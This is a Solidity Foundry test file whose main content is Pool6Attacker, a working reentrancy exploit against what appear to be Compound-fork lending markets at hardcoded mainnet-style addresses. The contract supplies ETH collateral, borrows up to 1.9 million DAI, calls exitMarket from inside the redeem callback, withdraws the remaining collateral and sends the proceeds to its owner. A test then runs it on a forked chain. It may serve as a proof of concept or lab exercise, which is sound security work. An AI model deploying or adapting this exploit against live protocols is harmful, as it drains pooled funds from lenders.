// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
    function getAllMarkets() external view returns (address[] memory);
    function borrowGuardianPaused(address) external view returns (bool);
    function mintGuardianPaused(address) external view returns (bool);
    function markets(address) external view returns (bool isListed, uint256 collateralFactorMantissa);
}

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function accrueInterest() external returns (uint256);
    function borrowBalanceCurrent(address) external returns (uint256);
}

interface ICErc20 {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function underlying() external view returns (address);
    function borrowBalanceCurrent(address) external returns (uint256);
}

contract Pool6Attacker {
    address constant COMPTROLLER = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    address constant F_DAI_6 = 0x989273ec41274C4227bCB878C2c26fdd3afbE70d;

    address payable public immutable owner;
    bool public redeemInFlight;
    bool public reentered;
    uint256 public exitCode;

    constructor() {
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        console.log("=== Pool 6 Reentrancy Exploit ===");
        console.log("Supplied ETH:", msg.value / 1e18);

        // Step 1: Mint fETH-6
        ICEther(F6_ETH).mint{value: msg.value}();
        uint256 cBalance = ICEther(F6_ETH).balanceOf(address(this));
        console.log("fETH-6 cTokens:", cBalance);

        // Step 2: Enter markets (fETH-6 as collateral)
        address[] memory markets = new address[](1);
        markets[0] = F6_ETH;
        uint256[] memory results = IComptroller(COMPTROLLER).enterMarkets(markets);
        require(results[0] == 0, "enterMarkets failed");

        // Step 3: Borrow DAI
        uint256 daiCash = ICErc20(F_DAI_6).getCash();
        uint256 daiBorrow = daiCash > 1_900_000 ether ? 1_900_000 ether : daiCash;
        console.log("Borrowing DAI:", daiBorrow / 1e18);

        uint256 borrowResult = ICErc20(F_DAI_6).borrow(daiBorrow);
        console.log("Borrow result:", borrowResult);
        if (borrowResult != 0) {
            console.log("Borrow failed, trying smaller amount");
            daiBorrow = daiBorrow / 2;
            borrowResult = ICErc20(F_DAI_6).borrow(daiBorrow);
            console.log("Borrow result 2:", borrowResult);
        }
        require(borrowResult == 0, "borrow DAI failed");

        address daiAddr = ICErc20(F_DAI_6).underlying();
        console.log("DAI balance:", IERC20(daiAddr).balanceOf(address(this)) / 1e18);

        // Check liquidity before redeem
        (uint256 err, uint256 liq, uint256 short) = IComptroller(COMPTROLLER).getAccountLiquidity(address(this));
        console.log("Pre-redeem err:", err);
        console.log("Pre-redeem liq:", liq / 1e18);
        console.log("Pre-redeem short:", short / 1e18);

        // Step 4: Redeem 1 cToken to trigger reentrancy (not redeemUnderlying)
        redeemInFlight = true;
        reentered = false;
        console.log("Calling redeem(1) - 1 cToken...");
        uint256 redeemResult = ICEther(F6_ETH).redeem(1);
        redeemInFlight = false;

        console.log("Redeem result:", redeemResult);
        console.log("Reentered:", reentered);
        console.log("Exit code:", exitCode);

        // Step 5: If exitMarket succeeded, redeem all remaining cTokens
        if (exitCode == 0 && reentered) {
            console.log("exitMarket succeeded! Redeeming all cTokens...");
            uint256 remaining = ICEther(F6_ETH).balanceOf(address(this));
            console.log("Remaining cTokens:", remaining);
            if (remaining > 0) {
                uint256 r = ICEther(F6_ETH).redeem(remaining);
                console.log("Redeem all result:", r);
            }
        } else {
            console.log("exitMarket failed or no reentrancy - attack unsuccessful");
        }

        // Send everything to owner
        uint256 payout = address(this).balance;
        console.log("Final ETH:", payout / 1e18);
        (bool ok,) = owner.call{value: payout}("");
        require(ok);
    }

    receive() external payable {
        if (!redeemInFlight || msg.sender != F6_ETH || reentered) {
            return;
        }
        reentered = true;
        console.log("=== REENTRANCY CALLBACK ===");
        console.log("ETH received in callback:", msg.value);

        // Try exitMarket during callback
        exitCode = IComptroller(COMPTROLLER).exitMarket(F6_ETH);
        console.log("exitMarket result:", exitCode);

        // Check liquidity after exitMarket
        (uint256 err2, uint256 liq2, uint256 short2) = IComptroller(COMPTROLLER).getAccountLiquidity(address(this));
        console.log("Post-exit err:", err2);
        console.log("Post-exit liq:", liq2 / 1e18);
        console.log("Post-exit short:", short2 / 1e18);
    }
}

contract Pool6Test is Test {
    function setUp() public {
        // Fork at current block
        vm.createSelectFork(vm.envString("RPC_CH3_FEIRARI"));
    }

    function test_pool6_reentrancy() public {
        // Fund the test account
        address deployer = address(this);
        vm.deal(deployer, 2000 ether);

        Pool6Attacker attacker = new Pool6Attacker();

        console.log("=== PRE-ATTACK STATE ===");
        console.log("Deployer ETH:", deployer.balance / 1e18);

        // Supply 1000 ETH for collateral
        attacker.attack{value: 1000 ether}();

        console.log("=== POST-ATTACK STATE ===");
        console.log("Deployer ETH:", deployer.balance / 1e18);
    }

    receive() external payable {}
}
